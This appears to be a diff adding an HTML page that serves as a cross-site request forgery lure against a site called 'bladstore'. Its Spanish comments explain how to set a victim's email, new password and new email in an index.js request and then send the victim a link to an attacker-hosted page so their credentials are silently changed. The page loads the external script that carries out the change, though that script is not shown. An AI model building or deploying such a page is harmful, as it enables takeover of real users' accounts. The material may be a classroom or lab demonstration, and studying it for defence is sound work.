@@ -1,0 +1,20 @@
+<!-- 
+    PASOS
+    [1.-] Modificar el "body" del fetch del archivo index.js en la funcion "CambioDeCuenta()"
+            en el parametro name=<email_victima> va el email de la victima, el cual es muy facil 
+                de sacarlo en esta caso puse un email registrado en el bladstore para atacarlo.
+                los demas parametros como "newpasswd" y "newemail" y "fullname" son modificables....
+                podemos cambiar los valores de esos parametros con valores nuevos.
+
+    [2.-] Para cambiar la cuenta de la victima por ataque csrf insertale esta url: 200.200.100.10:8090/csrf2.html?action=cambiarCuenta
+                la logica de javscript se encargara de verificar que lo que intentas hacer
+                es un cambio de las credenciales de la victima.
+
+-->
+
+<h1>Hola bienvenido</h1>
+<p>Dentro de esta pagina hay un script js malicioso porfavor no abras nunca una URL desconocida.</p>
+<a href="http://www.bladstore.net">Regresa a bladstore</a>
+
+<script src="http://localhost:8090/index.js">
+</script>
